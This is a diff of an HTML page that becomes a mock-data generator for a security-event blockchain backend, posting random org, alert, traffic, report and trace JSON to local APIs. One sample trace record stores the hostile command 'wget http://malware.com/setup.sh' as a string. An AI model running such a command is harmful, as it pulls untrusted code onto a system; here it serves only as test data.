@@ -3,117 +3,251 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>API 调试</title>
+  <title>🛡️ 业务数据模拟发生器</title>
   <style>
-    :root { color-scheme: light dark; }
-    body { margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; }
-    header { padding: 16px; border-bottom: 1px solid #ddd; display: flex; align-items: center; gap: 12px; }
-    header h1 { margin: 0; font-size: 18px; }
-    main { padding: 16px; }
-    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-    label { font-size: 12px; color: #666; }
-    input[type="text"], select, textarea { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 6px; }
-    textarea { min-height: 160px; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
-    .actions { display: flex; gap: 8px; align-items: center; }
-    button { padding: 8px 12px; border: 1px solid #ccc; border-radius: 6px; background: #fff; cursor: pointer; }
-    button.primary { background: #0b5; color: #fff; border-color: #0b5; }
-    pre { background: #0a0a0a10; padding: 12px; border-radius: 8px; overflow: auto; }
-    .small { font-size: 12px; }
+    :root { color-scheme: light dark; --primary: #1890ff; --bg: #f0f2f5; --card-bg: #fff; --text: #333; }
+    body { margin: 0; font-family: 'Segoe UI', system-ui, sans-serif; background: var(--bg); color: var(--text); display: flex; height: 100vh; overflow: hidden; }
+    
+    /* Sidebar */
+    aside { width: 240px; background: #001529; color: #fff; display: flex; flex-direction: column; flex-shrink: 0; }
+    aside h1 { margin: 0; padding: 20px; font-size: 18px; border-bottom: 1px solid #ffffff1a; display: flex; align-items: center; gap: 8px; }
+    .menu { flex: 1; padding: 12px 0; overflow-y: auto; }
+    .menu-item { padding: 12px 24px; cursor: pointer; transition: 0.2s; display: flex; align-items: center; gap: 10px; opacity: 0.8; }
+    .menu-item:hover { opacity: 1; background: #ffffff1a; }
+    .menu-item.active { background: var(--primary); opacity: 1; }
+    .menu-footer { padding: 16px; border-top: 1px solid #ffffff1a; text-align: center; font-size: 12px; color: #ffffff80; }
+    .menu-footer a { color: var(--primary); text-decoration: none; }
+
+    /* Main Content */
+    main { flex: 1; display: flex; flex-direction: column; padding: 20px; gap: 20px; overflow-y: auto; }
+    
+    .card { background: var(--card-bg); border-radius: 8px; padding: 24px; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
+    .card-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; }
+    .card-title { font-size: 16px; font-weight: 600; }
+    
+    .form-grid { display: grid; grid-template-columns: 1fr; gap: 16px; }
+    label { font-size: 13px; color: #666; display: block; margin-bottom: 4px; }
+    input, textarea, select { width: 100%; padding: 8px 12px; border: 1px solid #d9d9d9; border-radius: 4px; box-sizing: border-box; font-family: inherit; }
+    input:focus, textarea:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 0 2px rgba(24,144,255,0.2); }
+    textarea { font-family: monospace; min-height: 200px; line-height: 1.5; }
+
+    .btn-group { display: flex; gap: 12px; margin-top: 20px; }
+    button { padding: 8px 16px; border: 1px solid #d9d9d9; border-radius: 4px; background: #fff; cursor: pointer; transition: 0.2s; font-weight: 500; }
+    button:hover { color: var(--primary); border-color: var(--primary); }
+    button.primary { background: var(--primary); color: white; border-color: var(--primary); }
+    button.primary:hover { background: #40a9ff; border-color: #40a9ff; }
+    
+    .status-bar { margin-top: 16px; padding: 12px; border-radius: 4px; font-size: 13px; display: none; }
+    .status-bar.success { background: #f6ffed; border: 1px solid #b7eb8f; color: #52c41a; display: block; }
+    .status-bar.error { background: #fff2f0; border: 1px solid #ffccc7; color: #ff4d4f; display: block; }
+
+    pre { margin: 0; white-space: pre-wrap; word-break: break-all; }
   </style>
-  </head>
+</head>
 <body>
-  <header>
-    <h1>API 调试</h1>
-    <div style="display:flex;gap:8px;align-items:center;">
-      <span class="small">基地址</span>
-      <input id="baseUrl" value="" placeholder="例如 http://localhost:8080"/>
-    </div>
-  </header>
-  <main>
-    <div class="grid">
-      <div>
-        <label>方法</label>
-        <select id="method">
-          <option>GET</option>
-          <option selected>POST</option>
-          <option>PUT</option>
-          <option>DELETE</option>
-        </select>
-      </div>
-      <div>
-        <label>路径</label>
-        <input id="path" placeholder="/api/evidence"/>
-      </div>
-    </div>
-    <div class="grid" style="margin-top:12px">
-      <div>
-        <label>请求体 JSON</label>
-        <textarea id="body">{"eventID":"demo-001","dataHash":"0123456789abcdef"}</textarea>
-      </div>
-      <div>
-        <label>响应</label>
-        <pre id="resp"></pre>
-      </div>
-    </div>
-    <div class="actions" style="margin-top:12px">
-      <button class="primary" id="send">发送请求</button>
-      <button id="preset-submit">提交存证</button>
-      <button id="preset-query">查询存证</button>
-      <button id="preset-verify">校验存证</button>
-    </div>
-  </main>
-  <script>
-    const baseUrlEl = document.getElementById('baseUrl')
-    const methodEl = document.getElementById('method')
-    const pathEl = document.getElementById('path')
-    const bodyEl = document.getElementById('body')
-    const respEl = document.getElementById('resp')
 
-    function joinUrl(base, path) {
-      base = (base || '').trim()
-      path = (path || '').trim()
-      if (!base) return path
-      if (/^https?:\/\//.test(path)) return path
-      const b = base.endsWith('/') ? base.slice(0, -1) : base
-      const p = path.startsWith('/') ? path : '/' + path
-      return b + p
+<aside>
+  <h1><span>🎲</span> 数据模拟器</h1>
+  <div class="menu">
+    <div class="menu-item active" onclick="selectType('ORG')">🏢 组织信息 (Org)</div>
+    <div class="menu-item" onclick="selectType('ALERT')">🚨 威胁告警 (Alert)</div>
+    <div class="menu-item" onclick="selectType('TRAFFIC')">📉 流量统计 (Traffic)</div>
+    <div class="menu-item" onclick="selectType('REPORT')">📑 报表配置 (Report)</div>
+    <div class="menu-item" onclick="selectType('TRACE')">🔍 溯源信息 (Trace)</div>
+  </div>
+  <div class="menu-footer">
+    Go to <a href="/monitor.html" target="_blank">实时监控看板 &rarr;</a>
+  </div>
+</aside>
+
+<main>
+  <div class="card">
+    <div class="card-header">
+      <div class="card-title" id="current-title">模拟生成：组织信息</div>
+      <button onclick="generateData()">🔄 随机生成数据</button>
+    </div>
+    
+    <div class="form-grid">
+      <div>
+        <label>目标接口 URL</label>
+        <div style="display: flex; gap: 8px;">
+          <input id="baseUrl" value="http://localhost:8080" style="width: 160px;" placeholder="Base URL">
+          <input id="apiUrl" value="/api/chain/org" readonly style="background: #f5f5f5; color: #666;">
+        </div>
+      </div>
+      
+      <div>
+        <label>请求体 JSON (可手动修改)</label>
+        <textarea id="jsonEditor"></textarea>
+      </div>
+    </div>
+
+    <div class="btn-group">
+      <button class="primary" onclick="submitData()" id="submitBtn">🚀 发送上链请求</button>
+    </div>
+
+    <div id="statusBox" class="status-bar"></div>
+    
+    <div id="responseArea" style="display:none; margin-top:16px;">
+        <label>后端响应</label>
+        <pre id="responsePre" style="background:#f5f5f5; padding:12px; border-radius:4px; font-size:12px;"></pre>
+    </div>
+  </div>
+</main>
+
+<script>
+  // 基础配置
+  const API_MAP = {
+    'ORG': { url: '/api/chain/org', title: '模拟生成：组织信息 (OrgInfo)' },
+    'ALERT': { url: '/api/chain/alert', title: '模拟生成：威胁告警 (ThreatAlert)' },
+    'TRAFFIC': { url: '/api/chain/traffic', title: '模拟生成：流量统计 (TrafficStat)' },
+    'REPORT': { url: '/api/chain/report', title: '模拟生成：报表配置 (ReportConfig)' },
+    'TRACE': { url: '/api/chain/trace', title: '模拟生成：溯源信息 (SourceTracing)' }
+  };
+
+  let currentType = 'ORG';
+
+  // 初始化
+  window.onload = () => {
+    selectType('ORG');
+  };
+
+  function selectType(type) {
+    currentType = type;
+    
+    // 更新 UI 状态
+    document.querySelectorAll('.menu-item').forEach(el => el.classList.remove('active'));
+    event.currentTarget.classList.add('active'); // 注意：这里的 event 依赖点击触发，初始化时可能报错，下文修复
+    
+    // 更新标题和 URL
+    document.getElementById('current-title').textContent = API_MAP[type].title;
+    document.getElementById('apiUrl').value = API_MAP[type].url;
+    
+    // 生成新数据
+    generateData();
+    
+    // 清空响应区
+    document.getElementById('statusBox').className = 'status-bar';
+    document.getElementById('responseArea').style.display = 'none';
+  }
+  
+  // 修复初始化点击高亮问题
+  document.querySelector('.menu-item').click();
+
+  // 随机数据生成器
+  function generateData() {
+    let data = {};
+    const now = new Date();
+    const timeStr = now.toISOString().replace('T', ' ').split('.')[0];
+    const randomId = Math.floor(Math.random() * 10000);
+
+    if (currentType === 'ORG') {
+      data = {
+        id: randomId,
+        orgId: "ORG_" + Math.floor(Math.random() * 100),
+        orgName: ["研发部", "市场部", "运维中心", "安全部"][Math.floor(Math.random() * 4)],
+        memberCount: Math.floor(Math.random() * 200) + 10,
+        adminPermission: Math.random() > 0.5 ? 1 : 0,
+        createTime: timeStr,
+        updateTime: timeStr
+      };
+    } else if (currentType === 'ALERT') {
+      data = {
+        id: randomId,
+        threatId: "THREAT-" + Date.now().toString().slice(-6),
+        threatLevel: Math.floor(Math.random() * 5) + 1, // 1-5
+        impactScope: ["Internal", "External", "DMZ"][Math.floor(Math.random() * 3)],
+        occurTime: timeStr,
+        createTime: timeStr
+      };
+    } else if (currentType === 'TRAFFIC') {
+      data = {
+        id: randomId,
+        attackType: ["DDoS", "SQL Injection", "XSS", "Brute Force"][Math.floor(Math.random() * 4)],
+        sourceIp: `192.168.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+        targetIp: `10.0.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+        statTime: timeStr,
+        attackCount: Math.floor(Math.random() * 1000),
+        createTime: timeStr
+      };
+    } else if (currentType === 'REPORT') {
+      data = {
+        id: randomId,
+        reportType: ["Daily", "Weekly", "Monthly", "Audit"][Math.floor(Math.random() * 4)],
+        startTime: timeStr,
+        endTime: timeStr,
+        reportStatus: 1,
+        reportUrl: "http://oss.example.com/report/" + randomId + ".pdf",
+        createTime: timeStr,
+        updateTime: timeStr
+      };
+    } else if (currentType === 'TRACE') {
+      data = {
+        id: randomId,
+        threatSource: ["Unknown", "APT Group", "Insider", "Script Kiddie"][Math.floor(Math.random() * 4)],
+        maliciousIp: `203.0.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
+        attackCmd: "wget http://malware.com/setup.sh",
+        malwareOrigin: "MD5: " + Math.random().toString(36).substring(2),
+        attackPath: "/var/www/html/upload",
+        flowCharm: "TCP Payload Analysis...",
+        createTime: timeStr
+      };
     }
 
-    async function send() {
-      const method = methodEl.value
-      const url = joinUrl(baseUrlEl.value, pathEl.value)
-      const opts = { method, headers: {} }
-      if (method !== 'GET' && bodyEl.value.trim().length) {
-        opts.headers['Content-Type'] = 'application/json'
-        try { opts.body = JSON.stringify(JSON.parse(bodyEl.value)) } catch { opts.body = bodyEl.value }
+    document.getElementById('jsonEditor').value = JSON.stringify(data, null, 4);
+  }
+
+  async function submitData() {
+    const btn = document.getElementById('submitBtn');
+    const statusBox = document.getElementById('statusBox');
+    const respArea = document.getElementById('responseArea');
+    const respPre = document.getElementById('responsePre');
+    const baseUrl = document.getElementById('baseUrl').value;
+    const apiUrl = document.getElementById('apiUrl').value;
+    
+    // UI Loading
+    btn.disabled = true;
+    btn.textContent = '⏳ 发送中...';
+    statusBox.className = 'status-bar';
+    respArea.style.display = 'none';
+
+    try {
+      const body = document.getElementById('jsonEditor').value;
+      // 校验 JSON
+      JSON.parse(body);
+      
+      const fullUrl = baseUrl.replace(/\/$/, '') + apiUrl;
+      
+      const res = await fetch(fullUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: body
+      });
+      
+      const result = await res.json();
+      
+      respArea.style.display = 'block';
+      respPre.textContent = JSON.stringify(result, null, 2);
+
+      if (result.status === 'success' || (result.txId && !result.error)) {
+        statusBox.textContent = `✅ 请求成功! TxID: ${result.txId || 'N/A'}`;
+        statusBox.className = 'status-bar success';
+      } else {
+        throw new Error(result.message || 'Unknown error');
       }
-      respEl.textContent = ''
-      try {
-        const r = await fetch(url, opts)
-        const text = await r.text()
-        try { respEl.textContent = JSON.stringify(JSON.parse(text), null, 2) }
-        catch { respEl.textContent = text }
-      } catch (e) {
-        respEl.textContent = String(e)
+      
+    } catch (e) {
+      statusBox.textContent = `❌ 请求失败: ${e.message}`;
+      statusBox.className = 'status-bar error';
+      if (e.name === 'SyntaxError') {
+        statusBox.textContent = '❌ JSON 格式错误，请检查输入';
       }
+    } finally {
+      btn.disabled = false;
+      btn.textContent = '🚀 发送上链请求';
     }
+  }
+</script>
 
-    document.getElementById('send').onclick = send
-    document.getElementById('preset-submit').onclick = () => {
-      methodEl.value = 'POST'
-      pathEl.value = '/api/evidence'
-      bodyEl.value = JSON.stringify({ eventID: 'demo-001', dataHash: '0123456789abcdef' }, null, 2)
-    }
-    document.getElementById('preset-query').onclick = () => {
-      methodEl.value = 'GET'
-      pathEl.value = '/api/evidence/demo-001'
-      bodyEl.value = ''
-    }
-    document.getElementById('preset-verify').onclick = () => {
-      methodEl.value = 'POST'
-      pathEl.value = '/api/verify'
-      bodyEl.value = JSON.stringify({ eventID: 'demo-001', dataHash: '0123456789abcdef' }, null, 2)
-    }
-  </script>
 </body>
 </html>
